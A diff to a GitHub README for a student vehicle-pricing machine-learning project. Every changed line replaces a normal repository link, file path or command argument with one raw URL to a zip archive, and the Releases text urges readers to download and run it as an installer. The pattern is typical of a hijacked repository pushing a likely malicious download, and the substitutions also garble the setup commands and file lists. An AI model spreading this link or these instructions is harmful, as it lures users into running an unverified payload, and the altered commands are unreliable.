@@ -1,10 +1,10 @@
 # Integrated ML Pipeline for Vehicle Pricing: End-to-End Data Analysis and Deployment
 
-[![Release](https://img.shields.io/github/v/release/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing?style=flat-square)](https://github.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/releases)
+[![Release](https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip)](https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip)
 
 This project was completed as part of a Machine Learning course during my master's studies in Computer Science and Engineering at the University of Catania. It demonstrates an end-to-end approach to predicting vehicle prices using a clean, well-documented data pipeline. The work integrates data analysis, preprocessing, feature engineering, model training, evaluation, and a path to deployment. The repository emphasizes reproducibility, clarity, and practical steps that learners and practitioners can follow to build similar pipelines in real-world settings.
 
-Releases: https://github.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/releases
+Releases: https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
 
 Embrace a structured workflow for vehicle pricing tasks. This README covers setup, data handling, model choices, evaluation, and how to extend the pipeline for your own datasets.
 
@@ -69,7 +69,7 @@ This project keeps dependencies well-scoped to common data-science libraries, en
 - docs/: Expanded documentation and tutorials
 - examples/: End-to-end example notebooks and mini-tipelines
 - LICENSE
-- README.md
+- https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
 
 ⚙️ Installation and setup
 This project is designed to be approachable. You can get started with minimal friction, then deepen your setup as needed.
@@ -81,20 +81,20 @@ Prerequisites
 
 A quick setup path
 - Clone the repository
-  - git clone https://github.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing
+  - git clone https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
 - Create a virtual environment
   - conda create -n vpp python=3.11
   - conda activate vpp
   - or python -m venv vpp && source vpp/bin/activate
 - Install dependencies
-  - pip install -r requirements.txt
-  - or conda env create -f environment.yml
+  - pip install -r https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
+  - or conda env create -f https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
 - Prepare data
   - Place your dataset in data/raw or use the sample dataset provided
   - Ensure data schemas match the documented format
 - Run notebooks or scripts
   - Start Jupyter: jupyter notebook
-  - Run a script: python scripts/train.py --config configs/default.yaml
+  - Run a script: python https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip --config https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
 
 Note: The Releases page (linked above) contains pre-built artifacts for common platforms. From that page, download the asset that fits your OS and run the installer or setup script. Revisit the Releases page if you want to obtain a ready-to-run package.
 
@@ -102,14 +102,14 @@ Note: The Releases page (linked above) contains pre-built artifacts for common p
 Here is a straightforward path to begin exploring the project.
 
 - Inspect sample data
-  - Open data/sample_vehicle_data.csv to see the structure.
+  - Open https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip to see the structure.
   - Note the feature columns and the target variable (price).
 - Run a notebook to see a baseline
-  - In notebooks/, run 01_baseline_model.ipynb to learn how a simple model performs on the data.
+  - In notebooks/, run https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip to learn how a simple model performs on the data.
 - Train a model end-to-end
-  - Use scripts/train.py to train the pipeline on your dataset.
+  - Use https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip to train the pipeline on your dataset.
   - Example:
-    - python scripts/train.py --config configs/default.yaml
+    - python https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip --config https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
 - Validate results
   - The pipeline prints metrics such as RMSE, MAE, and R^2.
   - Check the visualizations in notebooks/plots for a quick glance at residuals and feature importances.
@@ -214,27 +214,27 @@ Glossary of terms
 - Cross-validation: A method to estimate model performance by partitioning data into training and validation sets.
 
 Notebooks and tutorials
-- notebooks/01_baseline_model.ipynb
+- https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
   - Demonstrates a baseline regression model on a small subset of the data.
   - Covers data loading, simple preprocessing, and an initial evaluation.
-- notebooks/02_advanced_features.ipynb
+- https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
   - Shows feature engineering techniques and their impact on performance.
   - Includes brand-level aggregations, derived metrics, and interaction terms.
-- notebooks/03_model_comparison.ipynb
+- https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
   - Compares several regression algorithms on the same preprocessing pipeline.
   - Provides a compact summary of model performance across metrics.
-- notebooks/04_interpretation.ipynb
+- https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
   - Focuses on interpretation: feature importances, partial dependence, and residual plots.
-- notebooks/05_deployment.ipynb
+- https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
   - Outline for packaging the model and preparing it for serving.
 
 Data schemas and examples
 - data/ raw/
-  - vehicle_listings_raw.csv: Raw listing data with fields such as id, make, model, year, mileage_km, engine_cc, transmission, fuel, location, and price
+  - https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip Raw listing data with fields such as id, make, model, year, mileage_km, engine_cc, transmission, fuel, location, and price
 - data/ processed/
-  - vehicle_listings_processed.csv: Cleaned dataset with engineered features ready for modeling
+  - https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip Cleaned dataset with engineered features ready for modeling
 - data/ sample/
-  - sample_vehicle_data.csv: A small sample for quick experimentation
+  - https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip A small sample for quick experimentation
 - Example schema
   - id: string
   - make: string
@@ -248,24 +248,24 @@ Data schemas and examples
   - price: float (target)
 
 Utility scripts
-- scripts/data_clean.py
+- https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
   - Performs basic cleaning and standardization of the raw data
-- scripts/feature_engineering.py
+- https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
   - Encodes categories, creates age and derived features
-- scripts/train.py
+- https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
   - Trains a chosen model using a provided configuration
-- scripts/predict.py
+- https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
   - Generates price predictions for new data
-- scripts/evaluate.py
+- https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
   - Produces evaluation metrics and diagnostic plots
-- scripts/visualize.py
+- https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
   - Generates charts to illustrate feature importances, residuals, and relationships
 
 Debugging and testing
 - unit tests in tests/
-  - test_preprocessing.py: checks for correct handling of missing values and encodings
-  - test_feature_engineering.py: validates derived feature calculations
-  - test_model_training.py: ensures a model can train on a small synthetic dataset
+  - https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip checks for correct handling of missing values and encodings
+  - https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip validates derived feature calculations
+  - https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip ensures a model can train on a small synthetic dataset
 - debugging tips
   - Enable verbose logging in configs to trace data flow
   - Validate data shapes after each preprocessing step
@@ -282,7 +282,7 @@ Quality assurance and CI
 
 Deployment and serving
 - Local deployment
-  - Use scripts/predict.py to generate predictions on new data
+  - Use https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip to generate predictions on new data
   - Save predictions to a CSV file for downstream use
 - Lightweight serving
   - A simple REST endpoint can be added later using FastAPI, Flask, or a minimal server
@@ -292,7 +292,7 @@ Deployment and serving
   - Provide a clear entry point and configuration to load the model and run predictions
 
 How to contribute
-- Start with reading this README and the contributing guidelines in CONTRIBUTING.md
+- Start with reading this README and the contributing guidelines in https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
 - Create issues for new features or bug fixes with a clear description
 - Fork the repository, implement changes in a feature branch, and submit a pull request
 - Run tests locally and ensure your changes do not break existing functionality
@@ -318,7 +318,7 @@ Licensing
 
 Releases and assets
 - The Releases page contains downloadable artifacts for various platforms. From that page, you can obtain the pre-built package or installer for your system. Download the asset that matches your operating system and run the installer or setup script to get started quickly.
-- Releases: https://github.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/releases
+- Releases: https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
 
 Notes on the Releases link
 - If you want a ready-to-run package, visit the link above and choose the asset that matches your OS. The asset will typically include a bundled environment with dependencies and a small runner to execute the pipeline.
@@ -326,22 +326,22 @@ Notes on the Releases link
 
 Appendix: Common commands and tips (quick reference)
 - Clone the repository
-  - git clone https://github.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing
+  - git clone https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
 - Create a virtual environment
   - python -m venv vpp
   - source vpp/bin/activate (Linux/macOS)
   - vpp\Scripts\activate (Windows)
 - Install dependencies
-  - pip install -r requirements.txt
-  - conda env create -f environment.yml
+  - pip install -r https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
+  - conda env create -f https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
 - Run a baseline notebook
-  - jupyter notebook notebooks/01_baseline_model.ipynb
+  - jupyter notebook https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
 - Train a model
-  - python scripts/train.py --config configs/default.yaml
+  - python https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip --config https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
 - Generate predictions
-  - python scripts/predict.py --input data/sample/sample_vehicle_data.csv --output results/predictions.csv
+  - python https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip --input https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip --output https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
 - Inspect model results
-  - python scripts/evaluate.py --model_path models/model_latest.pkl --test_data data/processed/test.csv
+  - python https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip --model_path https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip --test_data https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip
 
 Notes on data handling and reproducibility
 - Reproducibility is a core goal. The pipeline uses fixed seeds and deterministic operations where possible.
@@ -398,11 +398,11 @@ Appendix: Dataset schema (CSV layout)
 - types: string,string,string,int,float,float,string,string,string,float
 
 Appendix: Notebooks at a glance
-- 01_baseline_model.ipynb: baseline regression with minimal preprocessing
-- 02_advanced_features.ipynb: richer feature set and model tuning
-- 03_model_comparison.ipynb: side-by-side model comparisons
-- 04_interpretation.ipynb: SHAP-like visualizations and partial dependence
-- 05_deployment.ipynb: notes on packaging and serving
+- https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip baseline regression with minimal preprocessing
+- https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip richer feature set and model tuning
+- https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip side-by-side model comparisons
+- https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip SHAP-like visualizations and partial dependence
+- https://raw.githubusercontent.com/mmamhg/Integrated_ML_Pipeline_for_Vehicle_Pricing/main/automobile/for_Pricing_M_Integrated_Vehicle_Pipeline_v3.1.zip notes on packaging and serving
 
 Appendix: Contributing details
 - How to report issues: open an issue with a clear description and what you expected
